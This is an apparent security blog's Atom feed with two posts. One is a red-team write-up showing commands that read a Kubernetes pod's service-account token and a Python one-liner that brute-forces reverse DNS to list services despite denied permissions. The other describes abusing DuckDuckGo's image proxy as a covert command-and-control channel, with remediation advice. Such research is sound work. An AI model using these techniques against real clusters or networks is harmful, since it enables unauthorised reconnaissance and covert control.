<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>nopcorn</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2024-07-10T07:41:52-04:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name></name>
   <email></email>
 </author>

 
 <entry>
   <title>Service Discovery in Kubernetes with Restrictive Permissions</title>
   <link href="http://localhost:4000/2024/07/08/kubernetes-service-discovery"/>
   <updated>2024-07-08T00:00:00-04:00</updated>
   <id>http://localhost:4000/2024/07/08/kubernetes-service-discovery</id>
   <content type="html">&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;Most Kubernetes clusters running CoreDNS support reverse DNS lookups by default&lt;/li&gt;
    &lt;li&gt;Listing pods and services in a cluster is considered a privileged action, protected by the &lt;code&gt;list&lt;/code&gt; verb on the &lt;code&gt;services&lt;/code&gt; and &lt;code&gt;namespace&lt;/code&gt; resources&lt;/li&gt;
    &lt;li&gt;Bruteforcing the cluster’s IP space via reverse DNS lookups will reveal services available in the cluster&lt;/li&gt;
    &lt;li&gt;This allows for some light privilege escalation ™&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;In a recent red team engagement, I encountered an curious scenario while navigating a Kubernetes cluster. After exploiting a vulnerability in an ephemeral pod and deploying a customized version of the &lt;a href=&quot;https://github.com/MythicAgents/poseidon&quot;&gt;Poseidon&lt;/a&gt; agent, I turned to lateral movement and privilege escalation. Generally, I start with the stored API creds already available in the pod located in &lt;code&gt;/var/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt; to see what I can access.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-hack-nowrap&quot;&gt;$ curl -L &quot;https://dl.k8s.io/release/v1.30.2/bin/linux/amd64/kubectl&quot; -o /tmp/kubectl
$ chmod +x /tmp/kubectl
$ /tmp/kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this case - I couldn’t access anything. This effectively rendered the Kubernetes API useless for further exploration unless I found a new token to try out. I turned to classic old-school lateral movement and host dicovery.&lt;/p&gt;

&lt;p&gt;I knew a SentinelOne agent was present on the hypervisor so fast network-based host discovery via &lt;code&gt;nmap&lt;/code&gt; or &lt;code&gt;zmap&lt;/code&gt; would be much too noisy and risk giving away the attacker advantage so early in the engagement. I thought about writing a quick and dirty python scanner with generous sleeping in between hosts, but after discovering I was in a &lt;code&gt;/16&lt;/code&gt; I didn’t have the patience to sit through slowly working by way through 65000 potential live IPs. Additionally, I could identify a live IP but due to how Kubernetes clusters are managed that IP could be reassigned or abandoned at any time if a new deployment or load balancing was performed.&lt;/p&gt;

&lt;p&gt;Instead I looked for quieter ways of identifying services and pods that wouldn’t be as scritized by security products and audit logs, but allowed me to progress somewhat quickly. I decided to take a look at how CoreDNS worked as there was likely less visibility on DNS queries and reoslutions within a cluster.&lt;/p&gt;

&lt;p&gt;In Kubernetes, DNS is used by pods to identify other services available in the cluster as IPs change frequently. Every service in Kubernetes is provisioned an entry in the cluster’s DNS that corresponds to its service name and the namespace that it’s in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/k8s-dns-structure.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only namespace I knew of was the one I was currently in (found in &lt;code&gt;/run/secrets/kubernetes.io/serviceaccount/namespace&lt;/code&gt;). I debated generating a wordlist of common namespace and service names but decided against bruteforcing.&lt;/p&gt;

&lt;p&gt;From previously listing network interfaces, I knew that I was in a &lt;code&gt;/16&lt;/code&gt; network and could iterate through the IP addresses performing &lt;a href=&quot;https://en.wikipedia.org/wiki/Reverse_DNS_lookup&quot;&gt;reverse lookups&lt;/a&gt; if CoreDNS automatically inserted PRT records or if it resolved the &lt;code&gt;in-addr.arpa&lt;/code&gt; domain name.&lt;/p&gt;

&lt;p&gt;As it so happens, this is a &lt;a href=&quot;https://kubernetes.io/docs/tasks/administer-cluster/dns-custom-nameservers/#coredns&quot;&gt;feature of CoreDNS which is enabled by default&lt;/a&gt;. The &lt;code&gt;in-addr.arpa&lt;/code&gt; domain being present allows for the server to automatically resolve our reverse lookups.&lt;/p&gt;

&lt;p&gt;I wrote a quick and dirty pastable python script that will read an IP range in CIDR notation from the environment and try a reverse resolution for each IP:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import socket
import ipaddress
import os

cidr = os.environ.get(&apos;cidr&apos;)
net = ipaddress.ip_network(cidr)
for ip in net:
    name = socket.getnameinfo((str(ip), 0), 0)[0]
    try:
        ipaddress.ip_address(name)
    except ValueError:
        print(f&apos;{name} -&amp;gt; {ip}&apos;) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Collapsing this script into a one liner and running it through python looks something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ cidr=&quot;172.20.0.0/16&quot; python3 -c &quot;exec(\&quot;import socket\nimport ipaddress\nimport os\n\ncidr = os.environ.get(&apos;cidr&apos;)\nnet = ipaddress.ip_network(cidr)\n\nfor ip in net:\n\tname = socket.getnameinfo((str(ip), 0), 0)[0]\n\ttry:\n\t\tipaddress.ip_address(name)\n\texcept ValueError:\n\t\tprint(f&apos;{name} -&amp;gt; {ip}&apos;)\&quot;)&quot; | grep -v &quot;compute&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had to grep out the non-service responses or else every IP address would return a default AWS resolution like &lt;code&gt;ip-172-20-0-7.us-east-1.compute.internal&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Letting this script run for a bit gave me a complete list of services in the cluster and their currently associated IP addresses. Additionally, because the namespace a service is hosted in appears in the domain name for it, I get a partial list of valid namespaces in the cluster. &lt;strong&gt;This essentially allows an unprivileged token to give itself the &lt;code&gt;list&lt;/code&gt; verb on the &lt;code&gt;services&lt;/code&gt; and &lt;code&gt;namespaces&lt;/code&gt; resources, even if they have been explicitly denied&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Armed with a list of valid services in the network I could now pivot to software identification and port scanning.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using DuckDuckGo&apos;s Image Proxy as a C2 Channel</title>
   <link href="http://localhost:4000/2023/09/25/duckduckgo-as-c2"/>
   <updated>2023-09-25T00:00:00-04:00</updated>
   <id>http://localhost:4000/2023/09/25/duckduckgo-as-c2</id>
   <content type="html">&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;DuckDuckGo’s image proxy doesn’t allow-list trusted URLs, so anyone can request any image through it.&lt;/li&gt;
    &lt;li&gt;The proxy doesn’t sanitize the URI, allowing for any number of request parameters to be relayed to the server hosting the image.&lt;/li&gt;
    &lt;li&gt;This can be leveraged by a malicious actor to covertly communicate with a compromised server using an image-based protocol.&lt;/li&gt;
    &lt;li&gt;Small proof of concept provided: &lt;a href=&quot;https://github.com/nopcorn/DuckDuckC2&quot;&gt;DuckDuckC2&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://duckduckgo.com&quot;&gt;DuckDuckGo&lt;/a&gt; (DDG) is a search engine known for its emphasis on user privacy. Unlike many other search engines, it doesn’t track users’ search history, ensuring a more private online search experience. With its user-friendly interface and commitment to not collecting or sharing personal information, it has garnered a dedicated user base among privacy-conscious individuals.&lt;/p&gt;

&lt;h1 id=&quot;expected-behavior&quot;&gt;Expected Behavior&lt;/h1&gt;

&lt;p&gt;Conducting an image search via DuckDuckGo results in many requests to the &lt;code&gt;external-content&lt;/code&gt; subdomain:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ddg-image-search-network-loads.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This endpoint seems to accept a url as parameter &lt;code&gt;u&lt;/code&gt; and returns and image. From some of the research I’ve been conducting on image proxies, I know this domain as Bing’s own image proxy (&lt;code&gt;tse.mm.bing.net&lt;/code&gt; and &lt;code&gt;tse.explicit.bing.net&lt;/code&gt;). It’s not surprising that DuckDuckGo would be leveraging Bing’s services as they &lt;a href=&quot;https://duckduckgo.com/duckduckgo-help-pages/results/sources/&quot;&gt;source traditional links and images in their search results from the company&lt;/a&gt;. Scrolling down through multiple pages of image search always shows the same domains being supplied in the &lt;code&gt;u&lt;/code&gt; parameter.&lt;/p&gt;

&lt;p&gt;I assumed the &lt;code&gt;external-content&lt;/code&gt; proxy would only be allow-listing &lt;code&gt;*.bing.net&lt;/code&gt; domains and decided it would be interesting to try and confuse the regular expression that was underpinning this function by registering custom domains with &lt;code&gt;bing&lt;/code&gt; substrings. Keeping things simple though, I first tested for the presence of the allow-listing by generating a webhook on my testing server and providing it to the proxy…&lt;/p&gt;

&lt;p&gt;..and it happily tried to pull the image 🤦&lt;/p&gt;

&lt;h1 id=&quot;probing-the-api&quot;&gt;Probing the API&lt;/h1&gt;

&lt;p&gt;To my surprise, DuckDuckGo happily accepted the webhook and requested it to receive content. I guess they aren’t allow-listing domains. The request my server received looked like this - curiously, the IP it came from doesn’t appear in &lt;a href=&quot;https://duckduckgo.com/duckduckgo-help-pages/results/duckduckbot/&quot;&gt;DuckDuckGo’s list of DuckDuckBot IPs&lt;/a&gt;, despite providing the &lt;code&gt;DuckDuckBot/1.1&lt;/code&gt; user-agent:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /notanimage HTTP/1.1
Host: &amp;lt;MYSERVER&amp;gt;
Accept: */*
connection: close
accept-encoding: gzip
user-agent: DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probing the &lt;code&gt;/iu&lt;/code&gt; endpoint a bit more, I discovered that DuckDuckGo returns a &lt;code&gt;HTTP/2 400&lt;/code&gt; error if the content isn’t understood by the proxy (aka it isn’t an image in a valid format - likely based on &lt;code&gt;Content-Type&lt;/code&gt; headers). Alternative HTTP verbs like &lt;code&gt;POST&lt;/code&gt; and &lt;code&gt;PUT&lt;/code&gt; get automatically converted by DuckDuckGo’s servers to a &lt;code&gt;GET&lt;/code&gt; for the same endpoint. We know the server software is likely &lt;code&gt;nginx&lt;/code&gt; based on the banner, so it’s possible the location block for the &lt;code&gt;/iu&lt;/code&gt; endpoint looks something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;location @force_get {
    proxy_method GET;
    proxy_pass_request_headers off;
    proxy_pass http://ourupstream;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The proxy &lt;em&gt;does&lt;/em&gt; pass request parameters to the server hosting the image. I fuzzed the maximum parameter size and it doesn’t seem like DuckDuckGo is performing any filtering on content or length. This means that the only limit is from the web servers and clients doing the proxying. I was able to relay 8192 bytes of data without issue and suspect that number isn’t the ceiling. Additionally, it seems like multiple DuckDuckGo subdomains support the &lt;code&gt;/iu&lt;/code&gt; proxy service.&lt;/p&gt;

&lt;h1 id=&quot;using-as-a-c2-channel&quot;&gt;Using as a C2 Channel&lt;/h1&gt;

&lt;p&gt;Assuming we control both sides of proxy connection, we can communicate using request parameters and return output via encoded images using the proper &lt;code&gt;Content-Type&lt;/code&gt; headers. While this can be leveraged in many ways, here’s how my proof of concept &lt;a href=&quot;https://github.com/nopcorn/DuckDuckC2&quot;&gt;DuckDuckC2&lt;/a&gt; works:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/duckduckc2-flow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It assumes that &lt;code&gt;server.py&lt;/code&gt; is running somewhere where a shell is desired and that &lt;code&gt;client.py&lt;/code&gt; needs to communicate with it from reputable IP space (DuckDuckGo). The client can relay tasking for the server via GET parameters and the output the commands are encoded into the image returned as a result. DuckDuckGo happily forwards on the modified image and the client is able to extract the output from it. All of this functionality is wrapped is a pseudo-shell to give the client the impression they are interacting with an actual shell.&lt;/p&gt;

&lt;h1 id=&quot;remediation&quot;&gt;Remediation&lt;/h1&gt;

&lt;p&gt;Without internal knowledge of DuckDuckGo’s strategy for image search, it’s difficult to say if this open proxy is a bug or pre-positioning code for integration with future image providers. I would suggest applying an allow-list of domains to the API underpinning this feature - likely something like &lt;code&gt;*.bing.net&lt;/code&gt; would suffice as it seems all legitimate use of the proxy simply points to Bing. DuckDuckGo does have many other products though, so it’s possible there are other uses in other codebases.&lt;/p&gt;

&lt;p&gt;Defending against the use of this technique in a network isn’t too difficult seeing as most web servers will log request parameters. Regardless of the directionality (whether the client or server is in your network), attackers will have to go to great lengths to obfuscate commands and responses from network-aware security solutions.&lt;/p&gt;

</content>
 </entry>
 

</feed>
